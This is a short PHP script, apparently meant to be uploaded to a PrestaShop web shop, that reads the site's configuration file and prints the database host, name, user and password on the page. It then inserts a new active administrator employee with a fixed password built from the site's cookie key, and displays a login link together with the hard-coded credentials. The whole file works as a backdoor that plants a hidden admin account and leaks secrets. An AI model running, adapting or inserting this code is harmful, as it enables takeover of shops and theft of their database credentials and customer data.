<?
error_reporting( E_ALL );
ini_set('display_errors', 1); 
	echo "<h1>PrestaShop Adminer</h1>";
	echo "<h5>Tested on older version</h5>";
$config_file = $_SERVER['DOCUMENT_ROOT'].'/config/settings.inc.php';
include($config_file);
echo "<br />DB_HOST = " . _DB_SERVER_ ."<br />DB_NAME = " . _DB_NAME_ . "<br />DB_USER = " . _DB_USER_ . "<br />DB_PASSWORD = " . _DB_PASSWD_.  "<br />DB_PREFIX = ". _DB_PREFIX_;

$sql_connect = mysql_connect(_DB_SERVER_, _DB_USER_, _DB_PASSWD_) or exit("<p style='color:red'>Can't connect to MySQL</p>");
mysql_select_db(_DB_NAME_) or exit("Can't connect to database");

$DB_HOST = _DB_SERVER_;
$DB_NAME = _DB_NAME_;
$DB_USER_NAME = _DB_USER_;
$DB_PASSWORD = _DB_PASSWD_;
$DB_PREFIX =  _DB_PREFIX_;
$COOKIE_KEY = _COOKIE_KEY_;
$employee = $DB_PREFIX.'employee';
$employee_shop = $DB_PREFIX.'employee_shop';

$passMD5 = md5($COOKIE_KEY.'reenter2015');
echo $passMD5;
$query1 = "INSERT INTO  `$DB_NAME`.`$employee` (`id_employee`, `id_profile`, `id_lang`, `lastname`, `firstname`,`email`, `passwd`, `bo_theme`, `active`) 									VALUES ('1366613', '1', '1', 'reenter', 'reenter ok', 'support@reenter.ru', '$passMD5', 'default', '1');";
$resquerytest1 = mysql_query($query1) or die("<br /><p style='color: red'>Error: ".mysql_error()."</p>"); 
// $query2 = "INSERT INTO  `$DB_NAME`.`$employee_shop` (`id_employee`, `id_shop`)	VALUES ('1366613', '1');";
// $resquerytest2 = mysql_query($query2) or die("<br /><p style='color: red'>Error: ".mysql_error()."</p>"); 
	
	$http_host = $_SERVER['HTTP_HOST'];
	echo "<br /><p style='color: green'>Everything is ok! Try to login : <a href='http://$http_host/admin/' target='_blank'>$http_host/administrator/</a></p><p style='color: green'>Login: reenter2015</p><p style='color: green'>Password: reenter2015</p>";
?>